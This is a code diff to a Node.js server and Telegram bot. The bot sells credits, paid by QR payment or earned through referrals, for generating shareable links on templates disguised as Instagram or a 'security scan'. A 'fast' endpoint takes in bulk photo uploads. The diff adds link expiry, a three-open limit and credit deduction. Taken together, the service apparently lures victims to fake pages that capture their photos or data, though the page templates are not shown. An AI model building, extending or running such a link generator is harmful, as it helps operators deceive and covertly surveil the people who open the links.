failed",true);}catch(err){showToast("Error",true);}}\ndocument.getElementById("uploadForm").addEventListener("submit",async function(e){e.preventDefault();var fd=new FormData(e.target);try{var r=await fetch("/api/admin/upload",{method:"POST",body:fd});if(r.ok){showToast("Uploaded!");e.target.reset();loadPhotos();loadFeatured();}else showToast("Upload failed",true);}catch(err){showToast("Error",true);}});\nasync function loadChannels(){try{var r=await fetch("/api/admin/channels");var channels=await r.json();var list=document.getElementById("channelList");if(channels.length===0){list.innerHTML="<div class=\\"empty\\"><i>📢</i>No channels</div>";return;}var html="";for(var i=0;i<channels.length;i++){var c=channels[i];html+="<div class=\\"channel-item\\"><div><div class=\\"name\\">"+c.name+"</div><div class=\\"id\\">"+c.id+"</div></div><div><a href=\\""+c.link+"\\" target=\\"_blank\\" class=\\"btn btn-primary\\">Visit</a><button class=\\"btn btn-danger\\" onclick=\\"removeChannel(\\\'"+c.id+"\\\')\\">Remove</button></div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading channels",true);}}\nasync function addChannel(){var id=document.getElementById("channelId").value.trim();var name=document.getElementById("channelName").value.trim();var link=document.getElementById("channelLink").value.trim();if(!id||!name||!link){showToast("Fill all fields",true);return;}try{var r=await fetch("/api/admin/channels",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({id:id,name:name,link:link})});if(r.ok){showToast("Channel added!");["channelId","channelName","channelLink"].forEach(function(i){document.getElementById(i).value=""});loadChannels();}else showToast("Add failed",true);}catch(err){showToast("Error",true);}}\nasync function removeChannel(id){if(!confirm("Remove?"))return;try{var r=await fetch("/api/admin/channels/"+id,{method:"DELETE"});if(r.ok){showToast("Removed!");loadChannels();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}\nasync function loadUsers(){try{var r=await fetch("/api/admin/users");var users=await r.json();var list=document.getElementById("userList");var entries=Object.entries(users);if(entries.length===0){list.innerHTML="<div class=\\"empty\\"><i>👥</i>No users</div>";return;}var html="";for(var i=0;i<entries.length;i++){var id=entries[i][0];var data=entries[i][1];html+="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+id+"</div><div>⭐ Credits: "+(data.unlimited?"♾️ Unlimited":data.credits||0)+"</div><div>👥 Referrals: "+(data.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(data.joinedAt).toLocaleDateString()+"</div><div style=\\"font-size:12px;color:#888;\\">Referred by: "+(data.referredBy||"None")+"</div></div>";}list.innerHTML=html;}catch(err){showToast("Error loading users",true);}}\nasync function searchUser(){var uid=document.getElementById("searchUser").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/user/"+uid);var user=await r.json();if(user.error){showToast("User not found",true);return;}document.getElementById("userList").innerHTML="<div class=\\"user-card\\"><div class=\\"uid\\">🆔 "+uid+"</div><div>⭐ Credits: "+(user.unlimited?"♾️ Unlimited":user.credits||0)+"</div><div>👥 Referrals: "+(user.totalReferrals||0)+"</div><div>📅 Joined: "+new Date(user.joinedAt).toLocaleDateString()+"</div><div>Referred by: "+(user.referredBy||"None")+"</div></div>";}catch(err){showToast("Error",true);}}\nasync function modifyCredits(){var uid=document.getElementById("userIdInput").value.trim();var amount=parseInt(document.getElementById("creditAmount").value);if(!uid||isNaN(amount)){showToast("Enter valid User ID and amount",true);return;}try{var r=await fetch("/api/admin/modify-credits",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid,amount:amount})});var data=await r.json();if(data.success){showToast("Updated! New: "+data.credits);loadUsers();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}\nasync function toggleUnlimited(){var uid=document.getElementById("userIdInput").value.trim();if(!uid){showToast("Enter User ID",true);return;}try{var r=await fetch("/api/admin/toggle-unlimited",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({userId:uid})});var data=await r.json();if(data.success){showToast("Unlimited: "+(data.unlimited?"ON":"OFF"));loadUsers();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}\nasync function loadFeatured(){try{var r=await fetch("/api/admin/featured");var data=await r.json();var photos=await fetch("/api/admin/photos").then(function(r){return r.json()});var select=document.getElementById("featuredPhotoSelect");select.innerHTML="<option value=\\"\\">Select a photo...</option>";for(var i=0;i<photos.photos.length;i++){var p=photos.photos[i];var opt=document.createElement("option");opt.value=p.id;opt.textContent=p.caption||p.filename;if(data.photo===p.id)opt.selected=true;select.appendChild(opt);}var preview=document.getElementById("featuredPreview");if(data.photoData){preview.innerHTML="<img src=\\""+data.photoData.url+"\\" style=\\"max-width:200px;border-radius:10px;border:1px solid #2a2a4a;\\">";}else{preview.innerHTML="<p style=\\"color:#888;\\">No featured photo</p>";}document.getElementById("featuredMessageDisplay").innerHTML="<strong>Current:</strong> "+(data.message||"No message");document.getElementById("featuredMessage").value=data.message||"";var statusEl=document.getElementById("featuredStatus");if(data.status){statusEl.className="status-badge status-active";statusEl.textContent="✅ Active";}else{statusEl.className="status-badge status-inactive";statusEl.textContent="❌ Inactive";}}catch(err){showToast("Error loading featured",true);}}\nasync function setFeaturedPhoto(){var photoId=document.getElementById("featuredPhotoSelect").value;if(!photoId){showToast("Select a photo",true);return;}try{var r=await fetch("/api/admin/featured/photo",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({photoId:photoId})});if(r.ok){showToast("Featured photo updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}\nasync function removeFeaturedPhoto(){try{var r=await fetch("/api/admin/featured/photo",{method:"DELETE"});if(r.ok){showToast("Removed!");loadFeatured();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}\nasync function setFeaturedMessage(){var message=document.getElementById("featuredMessage").value.trim();if(!message){showToast("Enter a message",true);return;}try{var r=await fetch("/api/admin/featured/message",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({message:message})});if(r.ok){showToast("Message updated!");loadFeatured();}else showToast("Update failed",true);}catch(err){showToast("Error",true);}}\nasync function toggleFeaturedStatus(){try{var r=await fetch("/api/admin/featured/toggle",{method:"POST"});if(r.ok){showToast("Status toggled!");loadFeatured();}else showToast("Toggle failed",true);}catch(err){showToast("Error",true);}}\nasync function loadQR(){try{var r=await fetch("/api/admin/qr");var data=await r.json();var preview=document.getElementById("qrPreview");if(data.url){preview.style.display="block";document.getElementById("qrImage").src="/api/admin/qr?t="+Date.now();}else{preview.style.display="none";}}catch(err){}}\nasync function uploadQR(){var file=document.getElementById("qrUpload").files[0];if(!file){showToast("Select an image",true);return;}var fd=new FormData();fd.append("qr",file);try{var r=await fetch("/api/admin/upload-qr",{method:"POST",body:fd});var data=await r.json();if(data.success){showToast("QR uploaded!");loadQR();}else showToast("Upload failed",true);}catch(err){showToast("Error",true);}}\nasync function removeQR(){if(!confirm("Remove QR code?"))return;try{var r=await fetch("/api/admin/remove-qr",{method:"DELETE"});if(r.ok){showToast("QR removed!");loadQR();}else showToast("Remove failed",true);}catch(err){showToast("Error",true);}}\nasync function loadLogs(){try{var r=await fetch("/api/admin/logs");var data=await r.json();document.getElementById("logsDisplay").textContent=data.logs||"No logs available";}catch(err){document.getElementById("logsDisplay").textContent="Error loading logs";showToast("Error loading logs",true);}}\nasync function clearLogs(){if(!confirm("Clear all logs?"))return;try{var r=await fetch("/api/admin/logs",{method:"DELETE"});if(r.ok){showToast("Logs cleared!");loadLogs();}else showToast("Clear failed",true);}catch(err){showToast("Error",true);}}\nloadPhotos();loadChannels();loadUsers();loadFeatured();loadQR();\n</script></body></html>');
 });
 
@@ -521,17 +600,22 @@ app.post('/api/admin/featured/toggle', function(req, res) {
     res.json({ success: true, featured: featured });
 });
 
-// QR Code API
+// ====================== QR CODE API (FIXED) ======================
 app.post('/api/admin/upload-qr', upload.single('qr'), function(req, res) {
     try {
-        if (!req.file) return res.status(400).json({ error: 'No file' });
-        if (fs.existsSync(QR_FILE)) fs.unlinkSync(QR_FILE);
+        if (!req.file) {
+            return res.status(400).json({ error: 'No file uploaded' });
+        }
+        if (fs.existsSync(QR_FILE)) {
+            fs.unlinkSync(QR_FILE);
+        }
         fs.renameSync(req.file.path, QR_FILE);
-        console.log('✅ QR Code saved successfully');
+        console.log('✅ QR Code saved successfully at', QR_FILE);
         logToFile('📱 QR Code uploaded');
         res.json({ success: true, url: '/api/admin/qr' });
     } catch (err) {
         console.error('QR Upload Error:', err);
+        logToFile('❌ QR Upload Error: ' + err.message);
         res.status(500).json({ error: err.message });
     }
 });
@@ -674,12 +758,13 @@ app.post('/api/upload-photo-fast', async function(req, res) {
     }
 });
 
-// ====================== LINK GENERATION ======================
+// ====================== LINK GENERATION WITH EXPIRY & CREDIT DEDUCTION ======================
 app.get('/api/create-link', function(req, res) {
     var userid = req.headers.userid || 'unknown';
     var platform = req.headers.platform || 'instagram';
     var p = platform.toLowerCase();
     
+    // CHECK CREDITS BEFORE GENERATING LINK
     if (userid !== 'unknown') {
         var user = getUser(userid);
         if (!user.unlimited && (user.credits || 0) <= 0) {
@@ -690,8 +775,9 @@ app.get('/api/create-link', function(req, res) {
                 needBuy: true
             });
         }
+        // DEDUCT 1 CREDIT IMMEDIATELY
         useCredit(userid);
-        logToFile('🔗 Link generated for user ' + userid + ' - ' + platform);
+        logToFile('🔗 Link generated for user ' + userid + ' - ' + platform + ' (Credit deducted)');
     }
     
     var template;
@@ -713,15 +799,41 @@ app.get('/api/create-link', function(req, res) {
     var fileId = Date.now().toString(36) + Math.random().toString(36).substr(2, 3);
     fs.writeFileSync(path.join(PAGES_DIR, fileId + '.html'), html);
     var url = config.baseUrl + '/page/' + fileId;
+    
+    // SAVE LINK WITH EXPIRY AND OPEN LIMIT
+    createLink(userid, platform, fileId, url);
+    
     console.log('🔗 Link generated: ' + url + ' for user ' + userid);
+    console.log('⏰ Expires in 15 minutes, Max 3 opens');
     res.json({ success: true, url: url, id: fileId });
 });
 
+// ====================== PAGE VIEW WITH VALIDATION ======================
 app.get('/page/:id', function(req, res) {
     var id = req.params.id;
     var filePath = path.join(PAGES_DIR, id + '.html');
-    if (fs.existsSync(filePath)) res.sendFile(filePath);
-    else res.status(404).send('<h1>Page not found</h1>');
+    
+    // CHECK IF LINK IS VALID
+    if (!isLinkValid(id)) {
+        var link = getLink(id);
+        var reason = '';
+        if (!link) reason = 'Link not found';
+        else if (!link.active) reason = 'Link has expired';
+        else if (Date.now() > link.expiresAt) reason = 'Link expired (15 minutes limit)';
+        else if (link.opens >= link.maxOpens) reason = 'Link opened maximum 3 times';
+        else reason = 'Link is invalid';
+        
+        return res.send('<h1 style="color:#ff4757;text-align:center;margin-top:50px;">🔒 Link Expired</h1><p style="text-align:center;color:#888;">' + reason + '</p><p style="text-align:center;color:#888;">Please generate a new link.</p>');
+    }
+    
+    // INCREMENT OPEN COUNT
+    incrementLinkOpen(id);
+    
+    if (fs.existsSync(filePath)) {
+        res.sendFile(filePath);
+    } else {
+        res.status(404).send('<h1>Page not found</h1>');
+    }
 });
 
 // ====================== TELEGRAM BOT ======================
@@ -766,7 +878,7 @@ var SYBack = { inline_keyboard: [[{ text: '🔙 BACK', callback_data: 'back' }]]
 function getRegenMarkup(platform) {
     return {
         inline_keyboard: [
-            [{ text: '🔄 REGENERATE', callback_data: 'regen_' + platform }],
+            [{ text: '🔄 REGENERATE (1 Credit)', callback_data: 'regen_' + platform }],
             [{ text: '🔙 BACK', callback_data: 'back' }]
         ]
     };
@@ -955,6 +1067,8 @@ S7.on('callback_query', async function(q) {
         var photos = getPhotos();
         var channels = getChannels();
         var referrals = getReferrals();
+        var links = getLinks();
+        var totalLinks = Object.keys(links).length;
         
         await S7.sendMessage(cid,
             '📊 <b>Bot Statistics</b>\n\n' +
@@ -962,6 +1076,7 @@ S7.on('callback_query', async function(q) {
             '📷 Total Photos: ' + photos.length + '\n' +
             '📢 Total Channels: ' + channels.length + '\n' +
             '👥 Total Referrals: ' + referrals.length + '\n' +
+            '🔗 Total Links: ' + totalLinks + '\n' +
             '⏱ Uptime: ' + getUptime(),
             { parse_mode: 'HTML', reply_markup: SYBack }
         );
@@ -1064,14 +1179,14 @@ S7.on('callback_query', async function(q) {
         var user = getUser(uid);
         var credits = user.unlimited ? '♾️ Unlimited' : (user.credits || 0);
         await S7.sendMessage(cid,
-            '⭐ <b>Your Credits</b>\n\n💰 Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0) + '\n📅 Joined: ' + new Date(user.joinedAt).toLocaleDateString() + '\n\n🔹 Each link uses 1 credit\n🔹 Get +2 credits per referral\n🔹 New users get +3 bonus credits',
+            '⭐ <b>Your Credits</b>\n\n💰 Credits: ' + credits + '\n👥 Referrals: ' + (user.totalReferrals || 0) + '\n📅 Joined: ' + new Date(user.joinedAt).toLocaleDateString() + '\n\n🔹 Each link uses 1 credit\n🔹 Regenerate also uses 1 credit\n🔹 Links expire in 15 minutes\n🔹 Each link can be opened 3 times only',
             { parse_mode: 'HTML', reply_markup: SYBack }
         );
         await S7.deleteMessage(cid, mid);
         return;
     }
     
-    // ====================== BUY CREDITS ======================
+    // BUY CREDITS
     if (q.data === 'buy_credits') {
         var plans = {
             inline_keyboard: [
@@ -1092,7 +1207,7 @@ S7.on('callback_query', async function(q) {
         return;
     }
     
-    // ====================== PLAN SELECTION ======================
+    // PLAN SELECTION
     if (q.data.startsWith('plan_')) {
         var plan = q.data.replace('plan_', '');
         var amount, credits;
@@ -1141,7 +1256,7 @@ S7.on('callback_query', async function(q) {
         return;
     }
     
-    // ====================== PAYMENT ACCEPT (ADMIN) ======================
+    // PAYMENT ACCEPT (ADMIN)
     if (q.data.startsWith('pay_accept_') && isAdmin) {
         var userId = q.data.replace('pay_accept_', '');
         var user = getUser(userId);
@@ -1186,7 +1301,7 @@ S7.on('callback_query', async function(q) {
         return;
     }
     
-    // ====================== PAYMENT REJECT (ADMIN) ======================
+    // PAYMENT REJECT (ADMIN)
     if (q.data.startsWith('pay_reject_') && isAdmin) {
         var userId = q.data.replace('pay_reject_', '');
         var user = getUser(userId);
@@ -1218,7 +1333,7 @@ S7.on('callback_query', async function(q) {
         return;
     }
     
-    // ====================== PAYMENT DM (ADMIN) ======================
+    // PAYMENT DM (ADMIN)
     if (q.data.startsWith('pay_dm_') && isAdmin) {
         var userId = q.data.replace('pay_dm_', '');
         
@@ -1234,7 +1349,7 @@ S7.on('callback_query', async function(q) {
         return;
     }
     
-    // ====================== GENERATE LINKS ======================
+    // GENERATE LINKS - WITH CREDIT DEDUCTION
     if (q.data.startsWith('gen_') || q.data.startsWith('regen_')) {
         var isGen = q.data.startsWith('gen_');
         var platform = q.data.replace(isGen ? 'gen_' : 'regen_', '');
@@ -1242,16 +1357,21 @@ S7.on('callback_query', async function(q) {
         if (platform === 'securityscan') platform = 'securityScan';
         
         var user = getUser(uid);
+        
+        // CHECK CREDITS
         if (!user.unlimited && (user.credits || 0) <= 0) {
             await S7.answerCallbackQuery(q.id, {
-                text: '❌ Insufficient credits! Use referral or buy credits.',
+                text: '❌ Insufficient credits! Need 1 credit. Use referral or buy credits.',
                 show_alert: true
             });
             return;
         }
         
+        // DEDUCT CREDIT
+        useCredit(uid);
+        
         var loadingMsg = await S7.sendMessage(cid,
-            SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁'),
+            SYloveMenu(q.from.first_name, '𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙇𝙞𝙣𝙠... 🔁 (1 Credit deducted)'),
             { parse_mode: 'HTML', reply_markup: SYBack }
         );
         
@@ -1263,6 +1383,9 @@ S7.on('callback_query', async function(q) {
             var data = await response.json();
             
             if (data.error && data.needBuy) {
+                // Refund credit if link generation fails
+                user.credits = (user.credits || 0) + 1;
+                saveUsers(getUsers());
                 await S7.editMessageText(
                     SYloveMenu(q.from.first_name, '❌ ' + data.message + '\n\nClick "Buy Credits" to purchase.'),
                     { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
@@ -1271,7 +1394,13 @@ S7.on('callback_query', async function(q) {
             }
             
             var platformDisplay = platform === 'securityScan' ? 'SECURITY SCAN' : platform.toUpperCase();
-            var finalMsg = '✅ <b>Link Generated!</b>\n\n📎 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n📌 <b>Platform:</b> ' + platformDisplay + '\n🔄 Share and earn referrals!\n\n⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits - 1));
+            var finalMsg = '✅ <b>Link Generated!</b>\n\n' +
+                '📎 <b>Your Link:</b>\n<code>' + data.url + '</code>\n\n' +
+                '📌 <b>Platform:</b> ' + platformDisplay + '\n' +
+                '⏰ <b>Valid for:</b> 15 minutes\n' +
+                '🔢 <b>Max Opens:</b> 3 times\n' +
+                '🔄 Share and earn referrals!\n\n' +
+                '⭐ <b>Remaining Credits:</b> ' + (user.unlimited ? '♾️ Unlimited' : (user.credits || 0));
             
             await S7.editMessageText(
                 SYloveMenu(q.from.first_name, finalMsg),
@@ -1280,6 +1409,9 @@ S7.on('callback_query', async function(q) {
         } catch (err) {
             console.error('Link Error:', err.message);
             logToFile('❌ Link Error: ' + err.message);
+            // Refund credit if error occurs
+            user.credits = (user.credits || 0) + 1;
+            saveUsers(getUsers());
             await S7.editMessageText(
                 SYloveMenu(q.from.first_name, '❌ Error generating link'),
                 { chat_id: cid, message_id: loadingMsg.message_id, parse_mode: 'HTML', reply_markup: SYBack }
@@ -1419,7 +1551,8 @@ S7.on('message', async function(msg) {
         await S7.sendMessage(msg.chat.id,
             '📱 <b>Upload QR Code</b>\n\n' +
             'Please send the QR code image as a photo.\n' +
-            'This QR will be shown to users for payments.',
+            'This QR will be shown to users for payments.\n\n' +
+            '📌 Just send the photo and it will be saved.',
             { parse_mode: 'HTML' }
         );
     }
@@ -1451,9 +1584,18 @@ S7.on('message', async function(msg) {
         var photos = getPhotos();
         var channels = getChannels();
         var referrals = getReferrals();
+        var links = getLinks();
+        var totalLinks = Object.keys(links).length;
         var botInfo = await S7.getMe();
         
-        var statsMsg = '📊 <b>Bot Statistics</b>\n\n👥 Total Users: ' + totalUsers + '\n📷 Total Photos: ' + photos.length + '\n📢 Total Channels: ' + channels.length + '\n👥 Total Referrals: ' + referrals.length + '\n⏱ Uptime: ' + getUptime() + '\n🤖 Bot: @' + botInfo.username;
+        var statsMsg = '📊 <b>Bot Statistics</b>\n\n' +
+            '👥 Total Users: ' + totalUsers + '\n' +
+            '📷 Total Photos: ' + photos.length + '\n' +
+            '📢 Total Channels: ' + channels.length + '\n' +
+            '👥 Total Referrals: ' + referrals.length + '\n' +
+            '🔗 Total Links: ' + totalLinks + '\n' +
+            '⏱ Uptime: ' + getUptime() + '\n' +
+            '🤖 Bot: @' + botInfo.username;
         
         await S7.sendMessage(msg.chat.id, statsMsg, { parse_mode: 'HTML' });
     }
@@ -1488,7 +1630,7 @@ S7.on('message', async function(msg) {
     }
 });
 
-// ====================== QR PHOTO HANDLER ======================
+// ====================== QR PHOTO HANDLER (FIXED) ======================
 S7.on('message', async function(msg) {
     if (!msg.photo) return;
     var isAdmin = msg.from.id.toString() === config.adminId;
@@ -1501,7 +1643,9 @@ S7.on('message', async function(msg) {
             var fileLink = await S7.getFileLink(fileId);
             
             var response = await fetch(fileLink);
+            if (!response.ok) throw new Error('Failed to download image');
             var buffer = await response.arrayBuffer();
+            
             fs.writeFileSync(QR_FILE, Buffer.from(buffer));
             
             delete user._waitingForQR;
@@ -1544,6 +1688,22 @@ setInterval(function() {
     }
 }, 2000);
 
+// ====================== CLEAN EXPIRED LINKS ======================
+setInterval(function() {
+    var links = getLinks();
+    var changed = false;
+    for (var id in links) {
+        if (links[id].expiresAt < Date.now() || links[id].opens >= links[id].maxOpens) {
+            links[id].active = false;
+            changed = true;
+        }
+    }
+    if (changed) {
+        saveLinks(links);
+        logToFile('🧹 Cleaned expired/inactive links');
+    }
+}, 60000);
+
 // ====================== START SERVER ======================
 app.listen(config.port, function() {
     console.log('✅ Server running on port ' + config.port);
@@ -1553,6 +1713,8 @@ app.listen(config.port, function() {
     console.log('⚡ FAST MODE: 100 photos in ~4 seconds!');
     console.log('🔴 ALL BUTTONS ARE PINK/RED (DANGER STYLE)!');
     console.log('💰 BUY CREDITS WITH QR + ACCEPT/REJECT!');
+    console.log('⏰ Links expire in 15 minutes, max 3 opens');
+    console.log('💳 Each link generation uses 1 credit');
 });
 
 // ====================== ERROR HANDLING ======================
